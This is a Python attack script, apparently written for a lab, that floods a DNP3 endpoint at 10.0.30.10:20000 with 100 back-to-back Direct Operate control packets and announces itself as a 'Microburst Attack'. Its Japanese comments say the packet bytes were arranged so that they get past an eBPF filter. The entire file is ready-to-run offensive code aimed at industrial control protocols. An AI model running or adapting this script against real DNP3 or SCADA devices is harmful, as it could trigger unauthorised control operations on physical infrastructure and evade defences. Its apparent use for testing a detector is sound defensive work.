import socket
import time

TARGET_IP = "10.0.30.10"
TARGET_PORT = 20000
NUM_PACKETS = 100

print(f"[*] Starting Microburst Attack on {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Sending {NUM_PACKETS} DNP3 Direct Operate (0x05) packets as fast as possible...")

# Pre-establish connection
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, TARGET_PORT))
    
    # 修正: ペイロードを13バイト以上に拡張
    # 先頭2バイト (0x05, 0x64) はDNP3マジックバイト
    # 13バイト目 (インデックス12) にファンクションコード (0x05 = Direct Operate) を配置してeBPFを通過させる
    dnp3_payload_operate = b"\x05\x64\x0A\xC4\x01\x00\x00\x00\x00\x00\x00\xC0\x05"
    
    start = time.perf_counter()
    
    for i in range(NUM_PACKETS):
        # Fire without any sleep
        s.sendall(dnp3_payload_operate)
        
    end = time.perf_counter()
    s.close()
    
    elapsed = end - start
    print(f"[+] Sent {NUM_PACKETS} packets in {elapsed:.4f} seconds.")
    print(f"[+] Burst Rate: {NUM_PACKETS / elapsed:.2f} packets/sec")
    
except Exception as e:
    print(f"[-] Error: {e}")

print("[*] Microburst Attack Completed.")